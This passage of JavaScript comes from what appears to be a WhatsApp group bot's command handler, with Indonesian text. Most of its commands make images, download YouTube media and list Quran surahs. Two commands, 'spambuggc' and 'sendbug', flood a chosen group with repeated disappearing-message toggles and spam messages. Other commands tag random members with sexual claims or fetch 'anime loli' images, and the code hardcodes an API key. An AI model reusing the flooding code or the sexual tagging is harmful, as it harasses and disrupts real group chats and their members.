				linkgc = await benny.groupInviteCode(args[0]) 
				reply(`https://chat.whatsapp.com/${linkgc}`)
				break
				case 'linkgc':
				case 'linkgroup':
				case 'linkgrup':
				case 'grouplink':
				if (!isBotGroupAdmins) return reply(mess.only.Badmin)
				if (!isGroup) return reply(mess.only.group)
				linkgc = await benny.groupInviteCode(from) 
				reply(`https://chat.whatsapp.com/${linkgc}`)
				break 
				case 'ytcomment':
				
				if (args.length < 1) return reply(`Block nih contoh\n${prefix}ytcomment benny|woi subscribe gw`)
					var gh = body.slice(11)
					var namalu = gh.split("|")[0];
					var komenlu = gh.split("|")[1];
				anu = await fetchJson(`https://naufalhoster.xyz/textmaker/ytcomment?apikey=${naufalkey}&nama=${namalu}&comment=${komenlu}`)
				buffer = await getBaper(anu.result.image)
				benny.sendMessage(from, buffer, image, {quoted: adadeh})
					break
				case 'wolflogo':
				
					var gh = body.slice(10)
					var teks1 = gh.split("|")[0];
					var teks2 = gh.split("|")[1];
					if (args.length < 1) return reply(`Block nih contoh\nketik : ${prefix}wolflogo anjay|ohh`)
					reply(mess.wait)
					buffer = await getBaper(`https://api.vhtear.com/avatarwolf?text1=${teks1}&text2=${teks2}&apikey=${vhtearkey}`)
					benny.sendMessage(from, buffer, image, {quoted: adadeh})
					break
		        case 'carbon':
				
					var ghst = body.slice(8)
					if (args.length < 1) return reply(`Block nih contoh\nketik : ${prefix}codelogo nih heker`)
					reply(mess.wait)
					buffer = await getBaper(`https://carbonnowsh.herokuapp.com/?code=${ghst}&theme=darcula&backgroundColor=rgba(50,%2030,%2050,%20150)`)
					benny.sendMessage(from, buffer, image, {quoted: adadeh, caption: 'Neh..'})
					break
					case 'scarbon':
				
					var ghst = body.slice(9)
					if (args.length < 1) return reply(`Block nih contoh\nketik : ${prefix}codelogo nih heker`)
					reply(mess.wait)
					buffer = `https://carbonnowsh.herokuapp.com/?code=${ghst}&theme=darcula&backgroundColor=rgba(50,%2030,%2050,%20150)`
					sendStickerUrl(from, buffer)
					break
				case 'phlogo':
				
					gh = body.slice(8)
					teks1 = gh.split("|")[0];
					teks2 = gh.split("|")[1];
					if (args.length < 1) return reply(`Block nih contoh\nketik : ${prefix}phlogo anjay|ohh`)
					reply(mess.wait)
					buffer = await getBaper(`https://naufalhoster.xyz/textmaker/pornhub?apikey=${naufalkey}&text1=${teks1}&text2=${teks2}`)
					benny.sendMessage(from, buffer, image, {quoted: adadeh})
					break
				case 'cekjodoh':
				
				if (!isOwner && !ben.key.fromMe && !isPremium) return reply(mess.only.premium)
				var asu = body.slice(10)
					var teks5 = asu.split("|")[0];
					var teks6 = asu.split("|")[1];
					anu = await fetchJson(`http://scrap.terhambar.com/jodoh?n1=${teks5}&n2=${teks6}`)
					teks = `*Pasangan dengan data:*\n- *Nama cowok* : ${anu.result.nama_anda}\n- *Nama cewek* : ${anu.result.nama_pasangan}\n\n*Sisi:*\n- *Positif* : ${anu.result.sisi.positif}\n- *Negatif* : ${anu.result.sisi.negatif}`
			buffer = await getBaper(anu.result.gambar)
			benny.sendMessage(from, buffer, image, {caption: teks, quoted: adadeh})
					break
					case 'avengers':
				
				if (!isOwner && !ben.key.fromMe && !isPremium) return reply(mess.only.premium)
				var ghs = body.slice(10)
					var teks3 = ghs.split("|")[0];
					var teks4 = ghs.split("|")[1];
					if (args.length < 1) return reply(`Block nih contoh\nketik : ${prefix}customtahta anjay|ohh|aja`)
					reply(mess.wait)
					anu = await getBaper(`https://naufalhoster.xyz/textmaker/avenger?apikey=YunitaGanteng&text1=${teks3}&text2=${teks4}`)
					benny.sendMessage(from, anu, image, { caption: 'Neh..', quoted: adadeh})
					break
					case 'jadibot':
				require('./lib/jadibot').handler(from, benny, args, prefix, command )
				break
				case 'jadian':
				
					jds = []
					const jdii = groupMembers
					const koss = groupMembers
					const akuu = jdii[Math.floor(Math.random() * jdii.length)]
					const diaa = koss[Math.floor(Math.random() * koss.length)]
					teks = `Ciee.. yang lagi jadian @${akuu.jid.split('@')[0]} ♥️ @${diaa.jid.split('@')[0]} `
					jds.push(akuu.jid)
					jds.push(diaa.jid)
					mentions(teks, jds, true)
					break	
          case 'ngewe':
				
					jds = []
					const jdiid = groupMembers
					const kosst = groupMembers
					const akuut = jdiid[Math.floor(Math.random() * jdiid.length)]
					const diaat = kosst[Math.floor(Math.random() * kosst.length)]
					teks = `Yang ngewe kemarin di grub ini adalah @${akuut.jid.split('@')[0]} dan️ @${diaat.jid.split('@')[0]} `
					jds.push(akuut.jid)
					jds.push(diaat.jid)
					mentions(teks, jds, true)
					break	
               case 'terganteng':
				
					jds = []
					const jdiidc = groupMembers
					const kosstc = groupMembers
					const akuutc = jdiidc[Math.floor(Math.random() * jdiidc.length)]
					teks = `Yang terganteng di grub ini adalah @${akuutc.jid.split('@')[0]}`
					jds.push(akuutc.jid)
					mentions(teks, jds, true)
					break	
               case 'tercantik':
				
					jds = []
					const jdiidr = groupMembers
					const kosstr = groupMembers
					const akuutr = jdiidr[Math.floor(Math.random() * jdiidr.length)]
					teks = `Yang tercantik di grub ini adalah @${akuutr.jid.split('@')[0]}`
					jds.push(akuutr.jid)
					mentions(teks, jds, true)
					break
				case 'customtahta':
				
				if (!isOwner && !ben.key.fromMe && !isPremium) return reply(mess.only.premium)
				var ghs = body.slice(13)
					var teks3 = ghs.split("|")[0];
					var teks4 = ghs.split("|")[1];
					var teks5 = ghs.split("|")[2];
					if (args.length < 1) return reply(`Block nih contoh\nketik : ${prefix}customtahta anjay|ohh|aja`)
					reply(mess.wait)
					anu = await getBaper(`https://naufalhoster.xyz/textmaker/hartatahta_custom?apikey=${naufalkey}&text1=${teks3}&text2=${teks4}&text3=${teks5}`)
					benny.sendMessage(from, anu, image, {quoted: adadeh})
					break
					case 'loli2':
					
						{
							var items = ["anime loli"];
							var nime = items[Math.floor(Math.random() * items.length)];
							var url = "https://api.fdci.se/rep.php?gambar=" + nime;
							
							axios.get(url)
							  .then((result) => {
								var n = JSON.parse(JSON.stringify(result.data));
								var nimek =  n[Math.floor(Math.random() * n.length)];
								imageToBase64(nimek) 
								.then(
									(response) => {
										reply(mess.wait)
					var buf = Buffer.from(response, 'base64'); 
							benny.sendMessage(from, buf ,MessageType.image, { caption: `LOMLI`, quoted: adadeh } )
									}
								)
								.catch(
									(error) => {
										console.log(error);
									}
								)
							});
							}
						 break
						 case 'bokeh2':
						 
			tekss = body.slice(8)
			buffer = await getBaper(`https://naufalhoster.xyz/textmaker/bokeh?apikey=${naufalkey}&text=${tekss}`)
			teks = `BOKEH ${tekss}`
			reply(mess.wait)
					   benny.sendMessage(from, buffer, image, { caption: teks, quoted: adadeh })
				 break
			
				 case 'tahta':
				 
					var teks = body.slice(7)
					if (!teks) return benny.sendMessage(from, 'Input teks yang ingin di tulis', MessageType.text, {quoted: adadeh})
				var buffer = await getBaper(`https://api.vhtear.com/hartatahta?text=${teks}&apikey=${vhtearkey}`)
				reply(mess.wait)
					   benny.sendMessage(from, buffer, MessageType.image, { caption: `HARTA TAHTA ${teks}`, quoted: adadeh })
				 break
				 case 'blood':
				 
			    teks = body.slice(7)
				 blood = await getBaper(`https://naufalhoster.xyz/textmaker/blood?apikey=${naufalkey}&text=${teks}`)
				reply(mess.wait)
					   benny.sendMessage(from, blood, MessageType.image, { caption: `BLOOD ${teks}`, quoted: adadeh })
				 break
				 case 'matrix':
				 
			    teks = body.slice(8)
				 blood = await getBaper(`https://naufalhoster.xyz/textmaker/matrix?apikey=${naufalkey}&text=${teks}`)
				reply(mess.wait)
					   benny.sendMessage(from, blood, MessageType.image, { caption: `MATRIX ${teks}`, quoted: adadeh })
				 break
				 case 'party':
				 
					var teks = body.slice(7)
					if (!teks) return benny.sendMessage(from, 'Input teks yang ingin di tulis', MessageType.text, {quoted: adadeh})
				var buffer = await getBaper(`https://api.vhtear.com/partytext?text=${teks}&apikey=${vhtearkey}`)
				reply(mess.wait)
					   benny.sendMessage(from, buffer, MessageType.image, { caption: `PARTY ${teks}`, quoted: adadeh })
				 break
			 case 'profile':
				 
				 try {
					anu = await benny.getProfilePicture(sender)
				} catch {
					anu = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
				}
				 stat = await benny.getStatus(sender)
				 console.log(stat)
				 teks = `*╔❏* *USER INFO*\n*╠❏*\n*╠❏* *Nama:* ${pushname}\n*╠❏* *Status:* ${stat.status}\n*╠❏* *Premium:*  ${isPremium ? 'YES' : 'NO'}\n*╚❏* *Admin:*  ${isGroupAdmins ? 'YES' : 'NO'}\n\n================\n\nYour progress:\n*╠❏* *Limit:*  ${limit.getLimit(sender, _limit, limitCount)}\n`
				 buffer = await getBaper(anu)
				 benny.sendMessage(from, buffer, image, { caption: teks, quoted: adadeh})
		break 
		case 'cekprofile':
				 
				 if (!isGroup) return reply(mess.only.group)
				 mentioned = ben.message.extendedTextMessage.contextInfo.mentionedJid[0]
				 try {
					anu = await benny.getProfilePicture(mentioned)
				} catch {
					anu = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
				}
				 stat = await benny.getStatus(mentioned)
				 namadia = await getName(mentioned)
				 premdia = premium.checkPremiumUser(mentioned, _premium)
				 admdia = groupAdmins.includes(mentioned) || false
				 console.log(stat)
				 teks = `*╔❏* *USER INFO*\n*╠❏*\n*╠❏* *Nama:* ${namadia}\n*╠❏* *Status:* ${stat.status}\n*╠❏* *Premium:*  ${premdia ? 'YES' : 'NO'}\n*╚❏* *Admin:*  ${admdia ? 'YES' : 'NO'}\n\n==========================\n`
				 buffer = await getBaper(anu)
				 benny.sendMessage(from, buffer, image, { caption: teks, quoted: { "key": { "participant": numbernye, "remoteJid": setgrup, "fromMe": false, "id": "B391837A58338BA8186C47E51FFDFD4A" }, "message": { "documentMessage": { "jpegThumbnail": buffer, "mimetype": "application/octet-stream", "title": `_*PROFILE: ${namadia}*_`, "fileLength": "36", "pageCount": 0, "fileName": `_*PROFILE: ${namadia}*_` }}, "messageTimestamp": "1614069378", "status": "PENDING"}})
		break 
		 case 'limit':
                if (isPremium || isOwner) return reply('⤞ Limit left: ∞ (UNLIMITED)')
                reply(`⤞ Limit left: ${limit.getLimit(sender, _limit, limitCount)} / 25\n\n*_Limit direset pada pukul 00:00 WIB_*`)
            break
	        case 'bakar':
				 
				 if (args.length < 1) return reply('Teksnya mana??')
					var teksna = body.slice(7)
				buffer = await getBaper(`https://videfikri.com/api/textmaker/burnpaper/?text=${teksna}`) 
				break
				case 'stickbakar':
				 
				 if (args.length < 1) return reply('Teksnya mana??')
					var teksna = body.slice(12)
				anu = await fetchJson(`https://pecundang.herokuapp.com/api/textmaker?text=${teksna}&theme=burn-paper`)
reply(mess.wait)
					buffer = anu.result
					sendStickerUrl(from, buffer)
				 break
				 case 'quotesimage':
									
									 var ghs = body.slice(13)
									if (isMedia || isQuotedImage) {
										   ger = isQuotedImage ? JSON.parse(JSON.stringify(ben).replace('quotedM','m')).message.extendedTextMessage.contextInfo : ben
                                        reply(mess.wait)
					owgi = await benny.downloadAndSaveMediaMessage(ger)
					 var uploade = await uploadimg(owgi, Date.now() + '.jpg')
                                        teks = `${uploade.result.image}`
										buffer = `http://api.lolhuman.xyz/api/quotemaker3?apikey=${lolkey}&text=${ghs}&img=${teks}`
										sendStickerUrl(from, buffer)
									 }
									break
				 case 'quoteit2':
				 case 'qouteit2':
				 
					var teks = body.slice(10)
				 buffer = await getBaper(`https://naufalhoster.xyz/textmaker/quoteslife?apikey=${naufalkey}&quotes=${teks}`)
				 reply(mess.wait)
					benny.sendMessage(from, buffer, image, { caption: 'Block bucin', quoted: adadeh})
					break
				 case 'nulisbuku':
				 
					var teks = body.slice(11)
				var buffer = await getBaper(`https://api.zeks.xyz/api/nulis?text=${teks}&apikey=YunitaGanteng`)
				reply(mess.wait)
					   benny.sendMessage(from, buffer, MessageType.image, {quoted: adadeh})
				 break
				 case 'nulisfolio':
				 
					var teks = body.slice(12)
				var buffer = await getBaper(`https://api.vhtear.com/write?text=${body.slice(12)}&apikey=${vhtearkey}`)
				reply(mess.wait)
					     benny.sendMessage(from, buffer, MessageType.image, {quoted: adadeh})
				 break
				 case 'hitung':
				 
				 var mtk = body.slice(8)
				 teks = `「 *KALKULATOR* 」\n\nHasil dari:\n${mtk} = ${Math_js.evaluate(mtk)}`
				 reply(teks)
				 break
				 case 'jadwaltv':
		    
            if (args.length < 1) return reply('Kirim perintah *#jadwaltv [channel]*')
            tv = body.slice(10)
            anu = await fetchJson(`http://api.hurtzcrafter.xyz/jadwaltv?channel=${tv}`)
			if (anu.status === false) return reply(anu.message)
			teks = `*Jadwal TV* : ${tv}\n`
			for (let i of anu.result) {
				teks += `\n*Acara:* ${i.tayang}\n*Waktu:* ${i.jam}\n`
			}
            reply(teks.trim())
            break
			case 'video': // SEARCH VIDEO FROM YOUTUBE
        case 'vidio':
            if (args.length === 0) return reply(`Kirim perintah ${prefix}video judul video`)
            const querv = body.slice(7)
            reply(mess.wait)
            try {
                const resmusv = await axios.get(`https://pecundang.herokuapp.com/api/ytsearch?q=${encodeURIComponent(querv)}`)
                const jsonsercmuv = await resmusv.data
                let berhitung1 = 1
                const { result } = await jsonsercmuv
                let xixixai = `Hasil pencarian dari ${querv}\n\nKetik ${prefix}getvideo [angka] untuk mengambil ID\nContoh : ${prefix}getvideo 2\n`
                for (let i = 0; i < result.length; i++) {
                    xixixai += `\n═════════════════\n\n*Urutan* : ${i+1}\n*Title* : ${result[i].title}\n*Channel* : ${result[i].channel.name}\n*Durasi* : ${result[i].duration}\n*Perintah download* : ${prefix}getvideo ${result[i].id}\n`
                }
                    xixixai += `\n\n`
                for (let ii = 0; ii < result.length; ii++) {
                    xixixai += `(#)${result[ii].id}`
                }
                await sendMediaURL(from, result[0].thumbnail, xixixai)
            } catch (err){
                console.log(err)
            }
            break
            
        case 'music': // SEARCH MUSIC FROM YOUTUBE
        case 'musik':
           if (args.length === 0) return reply(`Kirim perintah ${prefix}music judul lagu`)
           const querv2 = body.slice(7)
           reply(mess.wait)
           try {
               const resmusv2 = await axios.get(`https://pecundang.herokuapp.com/api/ytsearch?q=${querv2}`)
               const jsonsercmuv2 = await resmusv2.data
               let berhitung1 = 1
               const { result } = await jsonsercmuv2
               let xixixai = `Hasil pencarian dari ${querv2}\n\nKetik ${prefix}getmusic [id] untuk mengambil lagu. Atau reply pesan ini dan ketik ${prefix}getmusic 2\n`
               for (let i = 0; i < result.length; i++) {
                   xixixai += `\n═════════════════\n\n*Urutan* : ${i+1}\n*Title* : ${result[i].title}\n*Channel* : ${result[i].channel.name}\n*Durasi* : ${result[i].duration}\n*Perintah download*:\n${prefix}getmusic ${result[i].id}\n`
               }
                   xixixai += `\n\n`
               for (let ii = 0; ii < result.length; ii++) {
                   xixixai += `(#)${result[ii].id}`
               }
               sendMediaURL(from, result[0].thumbnail, xixixai)
           } catch (err){
               console.log(err)
           }
           break
		   case 'getgroup':
				let a = []
				let gid = []
				for (mem of totalchat){
					a.push(mem.jid)
				}
				for (let o of a){
					if (o && o.includes('g.us')){
						gid.push(o)
					}
				}
				 teks = `Ingfo Grup\n\n`
				for (grup of gid){
					const ingfo = await benny.groupMetadata(grup)
					for (let i = 0; i < gid.length; i++) {
					teks += `*Urutan* : ${i+1}\nNama grup : ${ingfo.subject}\nID grup : ${ingfo.id}\nDibuat : ${moment(`${ingfo.creation}` * 1000).tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss')}\nJumlah Peserta : ${ingfo.participants.length}\n\n`
					}
				for (let ii = 0; ii < gid.length; ii++) {
                   teks += `(#)${ingfo[ii].id}`
               }
				}
				reply(teks.trim())
				break
        case 'getmusik':
        case 'getmusic':
            try {
                if (isQuotedImage) {
                    if (args.length === 0) return reply(`Kirim perintah *${prefix}getmusik _IdDownload_*`)
                    if (!Number(args[0])) return reply(`_Apabila ditag hanya cantumkan nomer urutan bukan ID Download!_  contoh : *!getmusik _1_*`)
                    const dataDownmp3 = ben.message.extendedTextMessage.contextInfo.quotedMessage.imageMessage.caption
                    const pilur = dataDownmp3.split('(#)')
                    reply(mess.wait)
                    
                    yta(`https://youtube.com/watch?v=${pilur[args[0]]}`)
                    .then((res) => {
                        const { dl_link, thumb, title, filesizeF, filesize } = res
                        axios.get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
                        .then((a) => {
                        if (Number(filesize) >= 30000) return sendMediaURL(from, thumb, `*Data Berhasil Didapatkan!*\n\n*Title* : ${title}\n*Ext* : MP3\n*Filesize* : ${filesizeF}\n*Link* : ${a.data}\n\n_Untuk durasi lebih dari batas disajikan dalam bentuk link_`)
                        const captions = `*Data Berhasil Didapatkan!*\n\n*Title* : ${title}\n*Ext* : MP3\n*Size* : ${filesizeF}\n\n_Silahkan tunggu file media sedang dikirim mungkin butuh beberapa menit_`
                        sendMediaURL(from, thumb,captions)
                        sendMediaURL(from, dl_link).catch(() => reply(mess.error.api))
                        })
                    }).catch((e) => {
                        reply('Kesalahan saat mendownload data yg dipilih! pastikan id from perintah *!musik* sudah benar.')
                    })

                } else if (ben.message.extendedTextMessage.contextInfo.quotedMessage) { 
                    reply(`_Salah tag! hanya tag pesan berisi data hasil from penelusuran musik._`)
                } else {
                    if (args.length === 0) return reply('Kirim perintah *!getmusik _IdDownload_*, untuk contoh silahkan kirim perintah *!readme*')
                    if (args[0] <= 25) return reply(`_Apabila ingin mengambil data musik dengan nomor urutan, mohon tag pesan bot tentang pencarian musik!_`,)
                    reply(mess.wait)
                    yta(`https://youtu.be/${args[0]}`)
                    .then((res) => {
                        const { dl_link, thumb, title, filesizeF, filesize } = res
                        axios.get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
                        .then((a) => {
                        if (Number(filesize) >= 30000) return sendMediaURL(from, thumb, `*Data Berhasil Didapatkan!*\n\n*Title* : ${title}\n*Ext* : MP3\n*Filesize* : ${filesizeF}\n*Link* : ${a.data}\n\n_Untuk durasi lebih dari batas disajikan dalam bentuk link_`)
                        const captions = `*Data Berhasil Didapatkan!*\n\n*Title* : ${title}\n*Ext* : MP3\n*Size* : ${filesizeF}\n\n_Silahkan tunggu file media sedang dikirim mungkin butuh beberapa menit_`
                        sendMediaURL(from, thumb, captions)
                        sendMediaURL(from, dl_link).catch(() => reply(mess.error.api))
                        })
                    })
                }
            } catch (err) {
                reply(`_Kesalahan! Pastikan id download sudah benar._`)
            }
            break
			case 'chats':
			anu = await benny.chats.all()
			console.log(anu)
			po = 1
			teks = `*LIST CHATS*\n\n`
			for (let i = 0; i < anu.length; i++) {
                   teks += `*${i+1}.* ${anu[i].name}\n*ID:* ${anu[i].jid}\n*Waktu Dibuat:* ${anu[i].t}\n======================\n`
               }
                   teks += `\n\n`
               for (let ii = 0; ii < anu.length; ii++) {
                   teks += `${anu[ii].jid}`
               }
				benny.sendMessage(from, teks.trim(), text, {quoted: adadeh})
			break
			case 'spambuggc':
			anu = body.slice(9)
			anu1 = anu.split('|')[0]
			anu2 = anu.split('|')[1]
			anu3 = anu.split('|')[2]
					anu = await benny.groupMetadata(anu1)
					reply(`*Berhasil mengirim bug gc ke ${anu.subject}*`)
					for (let i = 0; i < anu3; i++) {
						benny.toggleDisappearingMessages(anu1, "🙄")
	  benny.sendMessage(anu1, anu2, text)
	  }
					break
      case 'sendbug':
	  if (!ben.key.fromMe && !isOwner) return
	  if (args.length < 1) return
			anu = body.slice(9)
			ani = anu.split('|')[0]
			ani1 = anu.split('|')[1]
			for (let i = 0; i < ani1; i++) {
					benny.toggleDisappearingMessages(ani, "🙄")
			}
					anup = await benny.groupMetadata(ani)
					reply(`*Berhasil mengirim bug gc ke ${anup.subject}*`)
					break
        case 'getvideo':
            if (args.length === 0) return reply(`Kirim perintah *${prefix}getvideo* _IdDownload_`)
            try {    
            if (isQuotedImage) {
                if (!Number(args[0])) return reply(`_Apabila reply hanya cantumkan nomer urutan bukan ID Download!_  contoh : *!getvideo _1_*`)
                const dataDownmp3 = ben.message.extendedTextMessage.contextInfo.quotedMessage.imageMessage.caption
                const pilur = dataDownmp3.split('(#)')
                console.log(pilur[args[0]])
                reply(mess.wait)
                ytv(`https://youtu.be/${pilur[args[0]]}`)
                    .then((res) => {
                        // console.log(res)
                        const { dl_link, thumb, title, filesizeF, filesize } = res
                        axios.get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
                        .then((a) => {
                        if (Number(filesize) >= 40000) return sendMediaURL(from, thumb, `*Data Berhasil Didapatkan!*\n\n*Title* : ${title}\n*Ext* : MP3\n*Filesize* : ${filesizeF}\n*Link* : ${a.data}\n\n_Untuk durasi lebih dari batas disajikan dalam bentuk link_`)
                        const captions = `*Data Berhasil Didapatkan!*\n\n*Title* : ${title}\n*Ext* : MP3\n*Size* : ${filesizeF}\n\n_Silahkan tunggu file media sedang dikirim mungkin butuh beberapa menit_`
                        sendMediaURL(from, thumb, captions)
                        sendMediaURL(from, dl_link).catch(() => reply(mess.error.api))
                        })

                    })
                 
            } else if (ben.message.extendedTextMessage.contextInfo.quotedMessage) { 
                    reply(`_Salah reply cok! hanya tag pesan berisi data hasil from penelusuran video._`)
            } else {
                if (args.length === 0) return reply(`Kirim perintah *${prefix}getvideo _Id Video_*`)
                if (args[0] <= 25) return reply(`_Apabila ingin mengambil data video dengan nomor urutan, mohon tag pesan bot tentang pencarian video!_`,)
                reply(mess.wait)
                ytv(`https://youtu.be/${args[0]}`)
                    .then((res) => {
                        const { dl_link, thumb, title, filesizeF, filesize } = res
                        axios.get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
                        .then((a) => {
                        if (Number(filesize) >= 30000) return sendMediaURL(from, thumb, `*Data Berhasil Didapatkan!*\n\n*Title* : ${title}\n*Ext* : MP3\n*Filesize* : ${filesizeF}\n*Link* : ${a.data}\n\n_Untuk durasi lebih dari batas disajikan dalam bentuk link_`)
                        const captions = `*Data Berhasil Didapatkan!*\n\n*Title* : ${title}\n*Ext* : MP4\n*Size* : ${filesizeF}\n\n_Silahkan tunggu file media sedang dikirim mungkin butuh beberapa menit_`
                        sendMediaURL(from, thumb, captions)
                        sendMediaURL(from, dl_link).catch(() => reply(mess.error.api))
                        })
                    })
                }
            } catch (err) {
                reply(mess.error.api)
            }
            break
			case 'searchmsg':
       if (args.length < 1) return reply(`Penggunaan : *!searchmsg <Kata>*\nContoh : *${prefix}searchmsg ipul*`)
       const query = body.split(' ').slice(1).join(' ')
       const searched = await benny.searchMessages(query, from, 25, 1)
        if (searched.messages.length === 0){
          reply(`Kata *[ ${query} ]* tidak ditemukan!`)
             return
             }
          let katatemu = `*[ Message Search ]*\n\nDitemukan ${searched.messages.length - 1} pesan!\n`
          for (let i = 1; i < searched.messages.length - 1; i++) {
             let typeSrc = Object.keys(searched.messages[i].message)[0]
            typeSrc = typeSrc === 'extendedTextMessage' && searched.messages[i].message.extendedTextMessage.text.includes('@') ? typeSrc = 'mentionedText' : typeSrc
              const bodySrc = typeSrc == 'conversation' ? searched.messages[i].message.conversation : typeSrc == 'mentionedText' ? searched.messages[i].message.extendedTextMessage.text : typeSrc == 'extendedTextMessage' ? searched.messages[i].message.extendedTextMessage.text : typeSrc == 'imageMessage' ? searched.messages[i].message.imageMessage.caption : typeSrc == 'stickerMessage' ? 'Sticker' : typeSrc == 'audioMessage' ? 'Audio' : typeSrc == 'videoMessage' ? searched.messages[i].message.videoMessage.caption : typeSrc == 'documentMessage' ? 'document' : '[ PEPEK ]'//hurtz.message
                const senderSrc = isGroup ? searched.messages[i].participant : searched.messages[i].key.remoteJid
                 const jidSrc = senderSrc
				const dongoSrc = []
                  const contsSrc = searched.messages[i].key.fromMe ? benny.user.jid : benny.contacts[senderSrc] || { notify: jidSrc.replace(/@.+/, '') }
                 const pushnameSrc = searched.messages[i].key.fromMe ? benny.user.name : contsSrc.notify || contsSrc.vname || contsSrc.name || '-'
 
                    katatemu += `
 
Pesan : ${bodySrc}
Type : ${typeSrc}
Pengirim : ${senderSrc.replace('@s.whatsapp.net', '')} ( ${pushnameSrc} )
`
		  }
               benny.sendMessage(from, katatemu, text, {quoted: adadeh})
          break
			case 'qrmaker':
		    
            if (args.length < 1) return reply('Kirim perintah *#jadwaltv [channel]*')
			qr = body.slice(9)
            buffer = await getBaper(`https://api.zeks.xyz/api/qrencode?apikey=YunitaGanteng&text=${qr}`)
            benny.sendMessage(from, buffer, image, {quoted: adadeh, caption: `*QR Dari* : ${qr}`})
            break
			case 'listsurah':
			
             reply(`Berikut ini Daftar Nomor Surah
             
Untuk mencari ketik ${prefix}quran 1

1. Al-Fatihah الفاتحة
2. Al-Baqarah البقرة
3. Ali ‘Imran آل عمران
4. An-Nisa’ النّساء
5. Al-Ma’idah المآئدة
6. Al-An’am الانعام
7. Al-A’raf الأعراف
8. Al-Anfal الأنفال
9. At-Taubah التوبة
10. Yunus ينوس
11. Hud هود
12. Yusuf يسوف
13. Ar-Ra’d الرّعد
14. Ibrahim إبراهيم
15. Al-Hijr الحجر
16. An-Nahl النّحل
17. Al-Isra’ بني إسرائيل
18. Al-Kahf الكهف
19. Maryam مريم
20. Ta Ha طه
21. Al-Anbiya الأنبياء
22. Al-Hajj الحجّ
23. Al-Mu’minun المؤمنون
24. An-Nur النّور
25. Al-Furqan الفرقان
26. Asy-Syu’ara’ الشّعراء
27. An-Naml النّمل
28. Al-Qasas القصص
29. Al-‘Ankabut العنكبوت
30. Ar-Rum الرّوم
31. Luqman لقمان
32. As-Sajdah السّجدة
33. Al-Ahzab الْأحزاب
34. Saba’ سبا
35. Fatir فاطر
36. Ya Sin يس
37. As-Saffat الصّافات
38. Sad ص
39. Az-Zumar الزّمر
40. Al-Mu’min المؤمن
41. Fussilat فصّلت
42. Asy-Syura الشّورى
43. Az-Zukhruf الزّخرف
44. Ad-Dukhan الدّخان
45. Al-Jasiyah الجاثية
46. Al-Ahqaf الَأحقاف
47. Muhammad محمّد
48. Al-Fath الفتح
49. Al-Hujurat الحجرات
50. Qaf ق
51. Az-Zariyat الذّاريات
52. At-Tur الطّور
53. An-Najm النّجْم
54. Al-Qamar القمر
55. Ar-Rahman الرّحْمن
56. Al-Waqi’ah الواقعه
57. Al-Hadid الحديد
58. Al-Mujadilah المجادلة
59. Al-Hasyr الحشْر
60. Al-Mumtahanah الممتحنة
61. As-Saff الصّفّ
62. Al-Jumu’ah الجمعة
63. Al-Munafiqun المنافقون
64. At-Tagabun التّغابن
65. At-Talaq الطّلاق
66. At-Tahrim التّحريم
67. Al-Mulk الملك
68. Al-Qalam القلم
69. Al-Haqqah الحآقّة
70. Al-Ma’arij المعارج
71. Nuh نوح
72. Al-Jinn الجنّ
73. Al-Muzzammil المزمّل
74. Al-Muddassir المدشّر
75. Al-Qiyamah القيمة
76. Al-Insan الْاٍنسان
77. Al-Mursalat المرسلات
78. An-Naba’ النّبا
79. An-Nazi’at النّازعات
80. ‘Abasa عبس
81. At-Takwir التّكوير
82. Al-Infitar الانفطار
83. Al-Tatfif المطفّفين
84. Al-Insyiqaq الانشقاق
85. Al-Buruj البروج
86. At-Tariq الطّارق
87. Al-A’la الْأعلى
88. Al-Gasyiyah الغاشية
89. Al-Fajr الفجر
90. Al-Balad البلد
91. Asy-Syams الشّمس
92. Al-Lail الّيل
93. Ad-Duha الضحى
94. Al-Insyirah الانشراح
95. At-Tin التِّينِ
96. Al-‘Alaq العَلَق
97. Al-Qadr الْقَدْرِ
98. Al-Bayyinah الْبَيِّنَةُ
99. Az-Zalzalah الزلزلة
100. Al-‘Adiyat العاديات
101. Al-Qari’ah القارعة
102. At-Takasur التكاثر
103. Al-‘Asr العصر
104. Al-Humazah الهُمَزة
105. Al-Fil الْفِيلِ
106. Quraisy قُرَيْشٍ
107. Al-Ma’un الْمَاعُونَ
108. Al-Kausar الكوثر
109. Al-Kafirun الْكَافِرُونَ
110. An-Nasr النصر
111. Al-Lahab المسد
112. Al-Ikhlas الإخلاص
113. Al-Falaq الْفَلَقِ
114. An-Nas نَاسِ`)
break
				case 'randomsurah':
				
				anu = await fetchJson(`https://api.zeks.xyz/api/randomquran`)
				teks = `「 *RANDOM SURAH* 」\n\n\n- *Surah* : ${anu.result.nama}\n- *Arti* : ${anu.result.arti}\n- *Ayat* : ${anu.result.ayat}\n- *Asma* : ${anu.result.asma}\n- *Urut* : ${anu.result.urut}\n- *Nomor* : ${anu.result.nomor}\n- *Dari* : ${anu.result.type}\n- *Rukuk* : ${anu.result.rukuk}\n- *Ket* : ${anu.result.keterangan}\n`
				reply(teks)
				break
				case 'quran':
				reply(mess.wait)
					surah = body.slice(7)
				   anu = await fetchJson(`https://api.zeks.xyz/api/quran?no=${surah}&apikey=YunitaGanteng`)
				   quran = `Surah Al-Qur\`an Nomor: ${surah}\nSurah: ${anu.surah}\nDiturunkan Dikota: ${anu.type}\nJumlah Ayat: ${anu.jumlah_ayat}\n\n*${anu.ket}
				   \n==========================\n`
				   for (let surah of anu.ayat) {
					   quran += `${surah.number}\n${surah.text}\n${surah.translation_id}
				   \n================\n`}
				   lagu = await getBaper(anu.audio)
				   benny.sendMessage(from, lagu, audio, {mimetype: 'audio/mp3', ptt:true})
				   reply(quran.trim())
				   break
				case 'map':
					var teks = body.slice(5)
					axios.get('https://mnazria.herokuapp.com/api/maps?search='+teks)
					.then((res) => {
					  imageToBase64(res.data.gambar)
						.then(
						  (ress) => {
							benny.sendMessage(from, '_Otewe bang!_', MessageType.text, maping)
							var buf = Buffer.from(ress, 'base64')
							benny.sendMessage(from, buf, MessageType.image, { caption: `${teks}`, quoted: adadeh })
						})
					})
					break
				 case 'thunder':
				 
